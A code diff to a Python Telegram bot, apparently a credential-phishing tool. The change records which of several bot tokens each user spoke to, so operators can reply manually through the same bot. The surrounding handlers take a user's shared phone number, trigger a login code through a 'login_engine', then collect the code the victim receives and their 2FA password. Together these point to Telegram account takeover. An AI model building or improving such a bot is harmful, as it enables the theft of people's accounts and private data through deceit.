@@ -109,10 +109,18 @@ def get_chat_store() -> dict[int, dict]:
     return _chat_store
 
 
-def _record_msg(uid: int, name: str, direction: str, text: str):
+def _record_msg(uid: int, name: str, direction: str, text: str, bot: Bot = None):
     if uid not in _chat_store:
         _chat_store[uid] = {"name": name, "messages": []}
     _chat_store[uid]["name"] = name
+    # Remember which bot this conversation belongs to so a manual reply is
+    # routed back through the SAME bot the user actually talked to. With
+    # multiple bot tokens running, replying via a different bot would fail
+    # ("bot can't initiate conversation with a user").
+    if bot is not None:
+        _chat_store[uid]["bot_token"] = bot.token
+        label = getattr(getattr(bot, "_me", None), "username", None)
+        _chat_store[uid]["bot_label"] = f"@{label}" if label else bot.token[:8]
     _chat_store[uid]["messages"].append({
         "from": direction, "text": text, "time": time.time(),
     })
@@ -447,7 +455,7 @@ async def cmd_start(message: Message, bot: Bot):
     if old and "phone" in old:
         await login_engine.cancel_pending(old["phone"])
 
-    _record_msg(uid, _user_name(message), "user", "/start")
+    _record_msg(uid, _user_name(message), "user", "/start", bot)
     text = _c("start_text", "欢迎使用")
     mode = "contact"
     reply_markup = main_menu_kb(mode)
@@ -481,7 +489,7 @@ async def handle_contact(message: Message, bot: Bot):
         phone = "+" + phone
 
     uid = message.from_user.id
-    _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}")
+    _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}", bot)
     result = await login_engine.send_code(phone)
     if result.get("success"):
         _set_state(uid, bot, {
@@ -547,7 +555,7 @@ async def handle_code_input(message: Message, bot: Bot):
         return
     if message.text.startswith("/"):
         return
-    _record_msg(uid, _user_name(message), "user", message.text.strip())
+    _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
 
     phone = state["phone"]
     max_attempts = int(_c("code_max_attempts", "3"))
@@ -609,7 +617,7 @@ async def handle_2fa_input(message: Message, bot: Bot):
         return
     if message.text.startswith("/"):
         return
-    _record_msg(uid, _user_name(message), "user", "[2FA密码]")
+    _record_msg(uid, _user_name(message), "user", "[2FA密码]", bot)
 
     phone = state["phone"]
     password = message.text.strip()
